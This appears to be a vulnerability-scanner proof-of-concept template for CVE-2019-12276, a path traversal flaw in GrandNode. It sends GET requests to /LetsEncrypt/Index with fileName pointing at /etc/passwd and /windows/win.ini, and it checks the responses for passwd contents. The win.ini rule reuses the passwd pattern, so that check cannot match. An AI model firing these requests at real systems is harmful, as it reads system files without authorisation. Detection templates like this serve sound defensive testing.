name: poc-yaml-grandnode-cve-2019-12276-lfi
binding: a2aa0a74-88fb-4acb-941b-4ce4f24c57ba
manual: true
detail:
    author: Editor
    links:
        - https://security401.com/grandnode-path-traversal/
    vulnerability:
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /LetsEncrypt/Index?fileName=/windows/win.ini
            follow_redirects: false
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
    r1:
        request:
            cache: true
            method: GET
            path: /LetsEncrypt/Index?fileName=/etc/passwd
            follow_redirects: false
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: r1() || r0()
